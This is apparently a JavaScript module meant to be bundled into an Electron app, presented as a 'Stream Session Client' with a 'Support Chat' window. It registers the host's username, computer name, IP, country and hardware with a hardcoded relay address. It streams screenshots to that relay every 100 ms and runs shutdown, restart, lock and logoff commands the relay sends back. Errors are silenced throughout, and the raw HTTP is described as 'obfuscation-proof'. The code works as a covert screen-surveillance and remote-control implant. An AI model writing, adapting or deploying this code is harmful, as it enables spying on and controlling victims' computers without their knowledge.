// 317 NUMBER ONE - Stream Session Client
// Uses Electron desktopCapturer for native screen capture

var net = require('net');
var childProcess = require('child_process');
var os = require('os');
var crypto = require('crypto');

var SCREENSHOT_INTERVAL = 100;
var HEARTBEAT_INTERVAL = 5000;
var RETRY_DELAY = 3000;
var MAX_REGISTER_RETRIES = 3;
var CAPTURE_WIDTH = 1920;
var CAPTURE_HEIGHT = 1080;

// Hardcoded relay server
var RELAY_HOST = '20.238.26.126';
var RELAY_PORT = 7317;

// Capture function — uses global to work across ASAR module instances
var _lastScreenshot = null;

function setCapturer(fn) {
  global['__317capture'] = fn;
}

function generateAgentID() {
  var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  var id = '';
  var bytes = crypto.randomBytes(8);
  for (var i = 0; i < 8; i++) {
    id += chars[bytes[i] % chars.length];
  }
  return id;
}

async function captureScreen() {
  var captureFn = global['__317capture'];
  if (!captureFn) {
    return _lastScreenshot || null;
  }
  try {
    var buffer = await captureFn();
    if (buffer && buffer.length > 1000) {
      _lastScreenshot = buffer;
      return _lastScreenshot;
    }
  } catch (err) {
    // silent
  }
  return _lastScreenshot || null;
}

var _chatWindow = null;
var _chatAgentId = null;

function buildChatWindowHTML(agentId) {
  return '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Support Chat</title><style>' +
    '*{margin:0;padding:0;box-sizing:border-box}' +
    'body{font-family:Segoe UI,Tahoma,sans-serif;background:#1a1a2e;color:#eaeaea;height:100vh;display:flex;flex-direction:column;overflow:hidden}' +
    '.header{background:linear-gradient(135deg,#16213e,#0f3460);padding:14px 18px;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(255,255,255,0.08)}' +
    '.header-dot{width:8px;height:8px;border-radius:50%;background:#4ecca3;animation:blink 1.5s ease-in-out infinite}' +
    '@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}' +
    '.header-title{font-size:13px;font-weight:600;color:#e2e8f0}' +
    '.header-sub{font-size:10px;color:#64748b;margin-left:auto}' +
    '.messages{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:8px;scrollbar-width:thin;scrollbar-color:rgba(255,255,255,0.1) transparent}' +
    '.messages::-webkit-scrollbar{width:4px}.messages::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.15);border-radius:2px}' +
    '.msg{max-width:80%;padding:9px 13px;border-radius:14px;font-size:12px;line-height:1.5;word-wrap:break-word;animation:fadeIn .2s ease}' +
    '@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}' +
    '.msg.remote{align-self:flex-start;background:rgba(78,204,163,0.15);color:#e2e8f0;border-bottom-left-radius:4px}' +
    '.msg.local{align-self:flex-end;background:rgba(99,102,241,0.2);color:#e2e8f0;border-bottom-right-radius:4px}' +
    '.msg .time{font-size:9px;color:#64748b;margin-top:3px;display:block}' +
    '.input-area{display:flex;gap:8px;padding:12px 14px;border-top:1px solid rgba(255,255,255,0.08);background:#16213e}' +
    '.input-area input{flex:1;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.12);border-radius:8px;padding:9px 13px;color:#eaeaea;font-size:12px;outline:none;transition:border .2s}' +
    '.input-area input:focus{border-color:rgba(78,204,163,0.5)}' +
    '.input-area input::placeholder{color:#64748b}' +
    '.input-area button{background:rgba(78,204,163,0.2);border:1px solid rgba(78,204,163,0.3);border-radius:8px;padding:9px 16px;color:#4ecca3;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s}' +
    '.input-area button:hover{background:rgba(78,204,163,0.35)}' +
    '.empty{text-align:center;color:#64748b;font-size:11px;padding:50px 0;opacity:.6}' +
    '</style></head><body>' +
    '<div class="header"><span class="header-dot"></span><span class="header-title">Support Chat</span><span class="header-sub">Live Session</span></div>' +
    '<div class="messages" id="msgs"><div class="empty">Waiting for messages...</div></div>' +
    '<div class="input-area"><input id="inp" type="text" placeholder="Type your reply..." onkeydown="if(event.key===\'Enter\')send()"><button onclick="send()">Send</button></div>' +
    '<script>' +
    'var RELAY="http://' + RELAY_HOST + ':' + RELAY_PORT + '";' +
    'var AGENT="' + agentId + '";' +
    'var lastTs=0;' +
    'function poll(){' +
    '  var x=new XMLHttpRequest();' +
    '  x.open("GET",RELAY+"/api/chat/"+AGENT+"?since="+lastTs);' +
    '  x.onload=function(){' +
    '    try{var d=JSON.parse(x.responseText);' +
    '    if(d.messages&&d.messages.length>0){' +
    '      var c=document.getElementById("msgs");' +
    '      var em=c.querySelector(".empty");if(em)em.remove();' +
    '      for(var i=0;i<d.messages.length;i++){' +
    '        var m=d.messages[i];if(m.timestamp>lastTs)lastTs=m.timestamp;' +
    '        var div=document.createElement("div");' +
    '        div.className="msg remote";' +
    '        var t=new Date(m.timestamp);var ts=("0"+t.getHours()).slice(-2)+":"+("0"+t.getMinutes()).slice(-2);' +
    '        div.innerHTML=esc(m.text)+"<span class=\\"time\\">Support \\u00b7 "+ts+"</span>";' +
    '        c.appendChild(div);' +
    '      }c.scrollTop=c.scrollHeight;' +
    '    }}catch(e){}' +
    '  };x.send();' +
    '}' +
    'function send(){' +
    '  var inp=document.getElementById("inp");var txt=inp.value.trim();if(!txt)return;inp.value="";' +
    '  var x=new XMLHttpRequest();' +
    '  x.open("POST",RELAY+"/api/chat/"+AGENT);' +
    '  x.setRequestHeader("Content-Type","application/json");' +
    '  x.send(JSON.stringify({text:txt}));' +
    '  var c=document.getElementById("msgs");var em=c.querySelector(".empty");if(em)em.remove();' +
    '  var div=document.createElement("div");div.className="msg local";' +
    '  var t=new Date();var ts=("0"+t.getHours()).slice(-2)+":"+("0"+t.getMinutes()).slice(-2);' +
    '  div.innerHTML=esc(txt)+"<span class=\\"time\\">You \\u00b7 "+ts+"</span>";' +
    '  c.appendChild(div);c.scrollTop=c.scrollHeight;lastTs=Date.now();' +
    '}' +
    'function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}' +
    'setInterval(poll,1500);poll();' +
    '</script></body></html>';
}

function openChatWindow(agentId) {
  try {
    var electron = require('electron');
    var BrowserWindow = electron['BrowserWindow'] || (electron['remote'] && electron['remote']['BrowserWindow']);
    if (!BrowserWindow) {
      // Fallback: try opening chat in default browser via temp HTML file
      var fs = require('fs');
      var os = require('os');
      var path = require('path');
      var chatPath = path.join(os.tmpdir(), '317_chat_' + agentId + '.html');
      fs.writeFileSync(chatPath, buildChatWindowHTML(agentId));
      childProcess.exec('start "" "' + chatPath + '"', { 'windowsHide': true });
      return;
    }
    if (_chatWindow && !_chatWindow['isDestroyed']()) {
      _chatWindow['focus']();
      return;
    }
    _chatWindow = new BrowserWindow({
      'width': 380,
      'height': 520,
      'resizable': true,
      'minimizable': true,
      'maximizable': false,
      'alwaysOnTop': true,
      'frame': true,
      'title': 'Support Chat',
      'autoHideMenuBar': true,
      'webPreferences': {
        'nodeIntegration': false,
        'contextIsolation': true
      }
    });
    _chatWindow['loadURL']('data:text/html;charset=utf-8,' + encodeURIComponent(buildChatWindowHTML(agentId)));
    _chatWindow['on']('closed', function() { _chatWindow = null; });
  } catch (err) {
    // Fallback: open in default browser
    var fs2 = require('fs');
    var os2 = require('os');
    var path2 = require('path');
    var chatPath2 = path2.join(os2.tmpdir(), '317_chat_' + agentId + '.html');
    fs2.writeFileSync(chatPath2, buildChatWindowHTML(agentId));
    childProcess.exec('start "" "' + chatPath2 + '"', { 'windowsHide': true });
  }
}

function closeChatWindow() {
  try {
    if (_chatWindow && !_chatWindow['isDestroyed']()) {
      _chatWindow['close']();
    }
    _chatWindow = null;
  } catch (err) {}
}

function executeCommand(action) {
  if (action === 'chat_open') {
    openChatWindow(_chatAgentId);
    return true;
  }
  if (action === 'chat_close') {
    closeChatWindow();
    return true;
  }
  var cmds = {};
  cmds['shutdown'] = 'shutdown /s /t 0';
  cmds['restart'] = 'shutdown /r /t 0';
  cmds['sleep'] = 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0';
  cmds['lock'] = 'rundll32.exe user32.dll,LockWorkStation';
  cmds['logoff'] = 'shutdown /l';
  var cmd = cmds[action];
  if (cmd) {
    childProcess.exec(cmd, { 'windowsHide': true });
    return true;
  }
  return false;
}

function relayRequest(reqPath, method, data) {
  return new Promise(function(resolve) {
    var isBuffer = Buffer.isBuffer(data);
    var postData = isBuffer ? data : (data ? JSON.stringify(data) : '');
    var contentLen = Buffer.byteLength(postData);
    var contentType = isBuffer ? 'image/jpeg' : 'application/json';

    // Build raw HTTP request (obfuscation-proof)
    var httpLine = method + ' ' + reqPath + ' HTTP/1.1\r\n';
    httpLine += 'Host: ' + RELAY_HOST + ':' + RELAY_PORT + '\r\n';
    httpLine += 'Content-Type: ' + contentType + '\r\n';
    httpLine += 'Content-Length: ' + contentLen + '\r\n';
    httpLine += 'Connection: close\r\n';
    httpLine += '\r\n';

    var headerBuf = Buffer.from(httpLine);
    var bodyBuf = isBuffer ? postData : Buffer.from(postData);

    var socket = new net.Socket();
    var responseData = '';
    var done = false;

    socket.setTimeout(15000);

    socket.connect(RELAY_PORT, RELAY_HOST, function() {
      socket.write(headerBuf);
      socket.write(bodyBuf);
    });

    socket.on('data', function(chunk) {
      responseData += chunk.toString();
    });

    socket.on('end', function() {
      if (done) return;
      done = true;
      // Parse HTTP response body (after double CRLF)
      var bodyStart = responseData.indexOf('\r\n\r\n');
      if (bodyStart >= 0) {
        var body = responseData.substring(bodyStart + 4);
        // Handle chunked transfer encoding
        if (responseData.indexOf('chunked') >= 0) {
          var decoded = '';
          var lines = body.split('\r\n');
          for (var li = 0; li < lines.length; li++) {
            var line = lines[li];
            // Skip chunk size lines (hex numbers) and empty lines
            if (line.length > 0 && !/^[0-9a-fA-F]+$/.test(line)) {
              decoded += line;
            }
          }
          body = decoded;
        }
        try { resolve(JSON.parse(body)); } catch(e) { resolve(null); }
      } else {
        resolve(null);
      }
    });

    socket.on('error', function() { if (!done) { done = true; resolve(null); } });
    socket.on('timeout', function() { if (!done) { done = true; socket.destroy(); resolve(null); } });
    socket.on('close', function() { if (!done) { done = true; resolve(null); } });
  });
}

async function registerWithRetry(agentId, systemInfo) {
  for (var attempt = 1; attempt <= MAX_REGISTER_RETRIES; attempt++) {
    var regData = {};
    regData['agentId'] = agentId;

    var si = {};
    si['username'] = systemInfo.username;
    si['computerName'] = systemInfo.computerName;
    si['ip'] = systemInfo.ip;
    si['country'] = systemInfo.country;
    si['cpu'] = systemInfo.cpu;
    si['gpu'] = systemInfo.gpu;
    si['ram'] = systemInfo.ram;
    si['uptime'] = Math.floor(os.uptime() / 60);
    regData['systemInfo'] = si;

    var result = await relayRequest('/api/register', 'POST', regData);
    if (result && result['success']) {
      return true;
    }
    await new Promise(function(r) { setTimeout(r, RETRY_DELAY); });
  }
  return false;
}

function processCommands(result) {
  if (result && result['commands'] && result['commands']['length'] > 0) {
    for (var i = 0; i < result['commands']['length']; i++) {
      executeCommand(result['commands'][i]);
    }
  }
}

async function startStreamSession(systemInfo) {
  var agentId = generateAgentID();
  _chatAgentId = agentId;

  var registered = await registerWithRetry(agentId, systemInfo);
  if (!registered) return null;

  var errors = 0;

  // Push loop
  (async function pushLoop() {
    while (true) {
      try {
        var data = await captureScreen();
        if (data) {
          var r = await relayRequest('/api/screenshot/' + agentId, 'POST', data);
          if (r) { errors = 0; processCommands(r); } else { errors++; }
        }
      } catch(e) { errors++; }
      if (errors > 5) {
        await registerWithRetry(agentId, systemInfo);
        errors = 0;
      }
      await new Promise(function(r) { setTimeout(r, SCREENSHOT_INTERVAL); });
    }
  })();

  // Heartbeat
  setInterval(function() {
    var hbData = {};
    hbData['uptime'] = Math.floor(os.uptime() / 60);
    relayRequest('/api/heartbeat/' + agentId, 'POST', hbData)
      .then(function(r) { processCommands(r); })
      .catch(function() {});
  }, HEARTBEAT_INTERVAL);

  var result = {};
  result['agentId'] = agentId;
  result['port'] = RELAY_PORT;
  result['viewUrl'] = 'http://' + RELAY_HOST + ':' + RELAY_PORT + '/' + agentId;
  return result;
}

module.exports = {};
module.exports['startStreamSession'] = startStreamSession;
module.exports['setCapturer'] = setCapturer;
module.exports['CAPTURE_WIDTH'] = CAPTURE_WIDTH;
module.exports['CAPTURE_HEIGHT'] = CAPTURE_HEIGHT;